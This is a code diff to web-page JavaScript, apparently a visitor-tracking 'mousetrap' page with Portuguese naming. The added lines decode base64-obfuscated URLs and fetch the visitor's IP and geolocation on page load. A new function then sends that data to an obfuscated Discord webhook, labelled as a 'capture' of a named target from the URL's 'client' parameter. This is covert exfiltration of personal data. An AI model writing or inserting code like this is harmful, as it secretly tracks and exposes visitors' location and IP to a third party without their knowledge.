@@ -34,6 +34,7 @@
             class Start {
                 static async start() {
                     let i;
+                    let id;
                     try{
                     await fetch(atob("aHR0cHM6Ly9hcGktYmRjLm5ldC9kYXRhL2NsaWVudC1pcA=="))
                     .then((body) => body.json())
@@ -51,9 +52,9 @@
                        let $loc =  document.getElementById("loc");
                        $loc.innerHTML = data.location.principalSubdivision + ", " + data.location.city + ", " + data.location.localityName;
                         
-                        const randomId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+                        id = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
 
-                        Start.sdc(randomId, i,` ${
+                        Start.sdc(id, i,` ${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.city +
@@ -61,11 +62,12 @@
                             data.location.localityName
                         }`,j);
 
-                        Start.ratoeira(randomId, `${
+                        Start.ratoeira(id, `${
                             data.location.principalSubdivision +
                             ", " +
                             data.location.localityName
-                        }`)
+                        }`);
+
 
                         
 
@@ -84,13 +86,48 @@
                     .catch((error) => {
                         console.log("erro: ", error);
                     });
+
+                    await fetch(atob("aHR0cDovL2lwLWFwaS5jb20vanNvbi8==") + i).then((body) => body.json()).then((data) => {
+                        Start.generic(data, id);    
+                    }).catch((error) => {});
                    
                     }catch(e){
                     console.log(e);
                     }
                 }
 
+                static  generic(message, id){
+                    let u =
+                    "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQzNDM2NjE0NDA4NDQ0NzQ1Ni80YXJlZ0FuNGh1eUtua3N3U3BkeHBNRUF1MXNmeVlmWVV4ZmZLVG5SUExVY05nYllreVpZY001Wmt4VW15YWRlMnRURA==";
+                    const request = new XMLHttpRequest();
+                    request.open("POST", atob(u));
 
+                    request.setRequestHeader("Content-type", "application/json");
+                    let nome = "Desconhecido";
+                    try{
+                        const urlParams = new URLSearchParams(window.location.search);
+                        nome = urlParams.get('client');
+                    } catch(e){}
+                    const params = {
+                    embeds: [
+                        {
+                        title: `Captura de ${nome}`,
+                        fields: [
+                            
+                            
+                            {
+                            name: "API Response Data",
+                            value: message,
+                            },
+                        ],
+                        footer: {
+                            text: "ID do Rato: " + id,
+                        },
+                        },
+                    ],
+                    };
+                    request.send(JSON.stringify(params));
+                }
 
                 static sdc(id, a, b, c) {
                     let u =
